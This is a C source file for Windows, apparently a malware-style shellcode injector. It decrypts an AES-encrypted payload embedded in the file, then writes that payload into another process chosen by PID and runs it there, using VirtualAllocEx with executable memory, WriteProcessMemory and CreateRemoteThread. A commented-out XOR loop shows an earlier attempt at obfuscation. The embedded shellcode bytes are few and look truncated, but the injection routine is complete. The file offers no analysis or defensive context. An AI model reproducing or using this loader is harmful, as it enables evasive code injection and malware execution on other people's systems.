#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include "aes.h"
#define CTR 1
int main(int argc, char* argv[]){
    DWORD pid=0;
    DWORD tid=0;
    HANDLE hprocess,hthread=NULL;
    LPVOID base =NULL;
    uint8_t shellcode[] = "\x9e\x45\xab\x7e\xfd\x23\x1d\x70\xaa\x2c\x4e\x30\xa9\xb2\x9b";
    /*int i;
    char key = '!';
    for ( i = 0; i < sizeof(shellcode)-1; i++)
    {
        printf("//x%02x", shellcode[i]^key);
    }
    */
   struct AES_ctx ctx;
   uint8_t key[] = "@yj$4(bM3geUA$WT";
   uint8_t iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
   AES_init_ctx_iv(&ctx, key, iv);
   AES_CBC_decrypt_buffer(&ctx,shellcode,sizeof(shellcode));

       if (argc <2)
    {
        printf("need at least 2 arguments:\t%s\n",argv[0]);
    }
    else{
        pid=atoi(argv[1]);
        hprocess=OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD |PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,pid);
        
        if (hprocess==NULL)
        {
            printf("failed to open process: %ld\t error-code:%ld\n",pid,GetLastError());
            return EXIT_FAILURE;
        }
        printf("process sucessfully opened:%ld\tmemaddrhandle:%p\n",pid,hprocess);
        base = VirtualAllocEx(hprocess,NULL,sizeof(shellcode),(MEM_COMMIT| MEM_RESERVE),PAGE_EXECUTE_READWRITE);
        printf("memmory assigning pid:%ld\tvirtualallocvar:%p\n",pid,base);
        WriteProcessMemory(hprocess,base,shellcode,sizeof(shellcode),NULL);
        printf("sucessfully write in the memmory-_-\n");
        hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL,0,NULL);
        if (hthread == NULL)
        {
             printf("failed to open process: %ld\t error-code:%ld\n",pid,GetLastError());
             return EXIT_FAILURE;        
        }
        printf("Remote thread created:%ld\tcreated thread:%ld\n",hthread,pid);
        WaitForSingleObject(hthread,INFINITE);
        CloseHandle(hthread);
        CloseHandle(hprocess);
        printf("ohh-yeah");
        return EXIT_SUCCESS;       
        
    }
    return EXIT_SUCCESS;
//welcome to the hell-_-;
}